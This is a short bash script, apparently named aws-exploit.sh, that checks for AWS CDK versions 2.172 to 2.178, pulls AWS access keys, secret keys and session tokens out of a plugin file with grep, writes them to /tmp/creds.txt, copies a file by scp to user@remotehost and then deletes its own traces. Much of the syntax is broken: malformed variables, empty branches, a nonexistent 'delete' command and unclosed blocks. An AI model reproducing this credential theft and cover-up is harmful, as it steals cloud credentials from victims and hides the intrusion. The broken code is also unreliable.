//bash

//step 1 plug in
set -euo pipefail
OUTPUT_FILE="cdk-synth-output.json"
# {
#   "plugin": "/path/to/plugin"
# }

# if return {
#     accessKeyId: '<access-key>',
#     secretAccessKey: '<secret-access-key>',
#     sessionToken: '<session-token>',
#     expiration: <date>,
# };

ran=(1 + RANDOM % 1000)
touch hello($ran).log

if command -v cdk >/dev/null 2>&1; then
    VER=$(cdk --version 2>/dev/null | grep -E '^2\.' | head -n1 | cut -d' ' -f1)
    if [[ "$VER" =~ ^2\.17[2-8]\. ]] || [[ "$VER" =~ ^2\.178\.[0-1]$ ]]; then
        plugin="/path/to/plugin"
        if [[ -f "$plugin" ]]; then
            accessKeyId=$(grep -Po '(?s)"accessKeyId"\s*:\s*"\K[^"]+' "$plugin")
            secretAccessKey=$(grep -Po '(?s)"secretAccessKey"\s*:\s*"\K[^"]+' "$plugin")
            sessionToken=$(grep -Po '(?s)"sessionToken"\s*:\s*"\K[^"]+' "$plugin")
            expiration=$(grep -Po '(?s)"expiration"\s*:\s*"\K[^"]+' "$plugin")
            if [[expiration]]; then
                echo "accessKeyId: $accessKeyId" > /tmp/creds.txt 2> hello($ran).log
                echo "secretAccessKey: $secretAccessKey" >> /tmp/creds.txt 2>> hello($ran).log
                echo "sessionToken: $sessionToken" >> /tmp/creds.txt 2>> hello($ran).log
                echo "expiration: $expiration" >> /tmp/creds.txt 2>> hello
               
            fi
    else
        
    fi
else
    
fi




scp hello($ran).log user@remotehost:/path/to/destination/hello($ran).log

delete hello($ran).log
delete tmp/creds.txt
delete $OUTPUT_FILE
delete aws-exploit.sh

